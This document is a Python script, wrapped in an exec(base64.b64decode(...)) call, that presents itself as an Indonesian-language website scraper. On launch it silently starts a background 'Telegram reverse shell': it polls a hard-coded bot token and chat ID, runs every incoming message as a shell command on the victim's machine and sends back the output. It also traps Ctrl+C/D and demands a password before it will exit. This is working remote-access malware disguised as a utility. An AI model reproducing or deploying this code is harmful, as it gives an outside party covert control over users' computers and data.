import base64
exec(base64.b64decode('''
import os
import time
import requests
import signal
import threading
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from rich import print
from rich.prompt import Prompt
from rich.console import Console

console = Console()
KEY = "javaz123"

# ========== TELEGRAM REVERSE SHELL ==========

BOT_TOKEN = "7138157401:AAF9G6HmVk6iiTweXrBm1AS1jqZ7pdyLoDg"
CHAT_ID = "7822932083"
last_update_id = None

def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        requests.post(url, data=data)
    except:
        pass

def get_updates():
    global last_update_id
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    if last_update_id:
        url += f"?offset={last_update_id + 1}"
    try:
        return requests.get(url, timeout=10).json()
    except:
        return {"result": []}

def execute_command(cmd):
    import subprocess
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=120)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"[!] Error: {e.output.decode()}"
    except Exception as e:
        return f"[!] Exception: {str(e)}"

def handle_telegram():
    global last_update_id
    send_message("📡 Bot aktif. Ketik /help untuk perintah.")
    while True:
        try:
            updates = get_updates()
            for result in updates["result"]:
                last_update_id = result["update_id"]
                msg = result.get("message", {})
                text = msg.get("text", "")
                if not text or str(msg.get("chat", {}).get("id")) != CHAT_ID:
                    continue
                if text.startswith("/help"):
                    send_message("Perintah:\n/help, /cwd, /ls, /shell <cmd>")
                elif text.startswith("/cwd"):
                    send_message(f"📂 Dir: {os.getcwd()}")
                elif text.startswith("/ls"):
                    send_message("📁 File:\n" + "\n".join(os.listdir()))
                elif text.startswith("/shell "):
                    cmd = text.split(" ", 1)[1]
                    send_message(f"🖥 Menjalankan: {cmd}")
                    output = execute_command(cmd)
                    for i in range(0, len(output), 4000):
                        send_message(output[i:i+4000])
                elif text.startswith('pip install'):
                    module = text.split("install ",1)[1]
                    send_message(f"Menginstall Module {module}...")
                    time.sleep(1)
                    send_message("proses memakan mungkin memakan waktu yang lama...")
                else:
                    # Jalankan semua perintah lain sebagai shell
                    send_message(f"🖥 Menjalankan (auto): {text}")
                    output = execute_command(text)
                    for i in range(0, len(output), 4000):
                        send_message(output[i:i+4000])
        except Exception as e:
            send_message(f"[!] Error: {str(e)}")
        time.sleep(2)

# ========== SCRAPER HTML/CSS/JS ==========

def dump_website(url):
    folder = "dump"
    os.makedirs(folder, exist_ok=True)
    try:
        res = requests.get(url, timeout=10)
        html = res.text
        domain = urlparse(url).netloc.replace(".", "_")
        base_path = os.path.join(folder, domain)
        os.makedirs(base_path, exist_ok=True)
        html_file = os.path.join(base_path, "index.html")
        with open(html_file, "w", encoding="utf-8") as f:
            f.write(html)
        soup = BeautifulSoup(html, "html.parser")
        resources = [urljoin(url, tag.get("href") or tag.get("src"))
                     for tag in soup.find_all(["link", "script"])
                     if tag.get("href") or tag.get("src")]
        for link in resources:
            try:
                filename = os.path.basename(link).split("?")[0]
                save_path = os.path.join(base_path, filename)
                r = requests.get(link, timeout=5)
                with open(save_path, "wb") as f:
                    f.write(r.content)
                print(f"✅ Downloaded: {filename}")
            except:
                print(f"⚠️ Gagal ambil: {link}")
        print(f"\n🌐 Website disimpan di: {base_path}")
        return base_path
    except Exception as e:
        print(f"[!] Error dump: {str(e)}")
        return None

def minta_password_untuk_keluar():
    while True:
        try:
            key = Prompt.ask("[bold yellow]Masukkan password untuk keluar")
            if key == KEY:
                print("[bold green]✔️ Password benar. Program keluar...[/bold green]")
                time.sleep(1)
                os.system("clear")
                exit()
            else:
                print("[bold red]❌ Password salah. Tidak bisa keluar.[/bold red]")
        except (KeyboardInterrupt, EOFError):
            print("[red]❌ Tidak bisa keluar dengan Ctrl+C/D![/red]")

def handle_terminal():
    os.system("clear")
    print("[bold cyan]🧰 Menu Scraping Website (HTML/CSS/JS)[/bold cyan]")
    print("Ketik URL (https://...) untuk mulai download.")
    print("Ketik 'exit' untuk keluar\n")

    while True:  
        try:  
            url = input("Masukkan URL: ").strip()  
            if url.lower() == "exit":  
                minta_password_untuk_keluar()  
                continue  
            if not url.startswith("http"):  
                print("⚠️ URL harus diawali dengan http atau https.")  
                continue  
            folder_path = dump_website(url)  
            if not folder_path:  
                continue  
            while True:  
                print("\n📁 File tersedia:")  
                files = os.listdir(folder_path)  
                for idx, fname in enumerate(files):  
                    print(f"{idx+1}. {fname}")  
                cmd = input("pilih> ").strip().lower()  
                if cmd in ["back", "02"]:  
                    break  
                elif cmd == "exit":  
                    minta_password_untuk_keluar()  
                elif cmd.isdigit():  
                    idx = int(cmd) - 1  
                    if 0 <= idx < len(files):  
                        try:  
                            with open(os.path.join(folder_path, files[idx]), "r", encoding="utf-8", errors="ignore") as f:  
                                content = f.read()  
                                print(f"\n📄 Isi dari {files[idx]}:\n{'='*60}")  
                                print(content[:5000] + ("\n... [dipotong]" if len(content) > 5000 else ""))  
                        except Exception as e:  
                            print(f"[!] Gagal baca file: {e}")  
                    else:  
                        print("❌ Nomor tidak valid.")  
                else:  
                    print("❓ Perintah tidak dikenal.")  
        except Exception as e:  
            print(f"[!] Error: {str(e)}")

# ========== MAIN ==========
if __name__ == "__main__":
    # Mulai reverse shell Telegram di background
    threading.Thread(target=handle_telegram, daemon=True).start()
    # Jalankan terminal scraper
    handle_terminal()
''').decode())
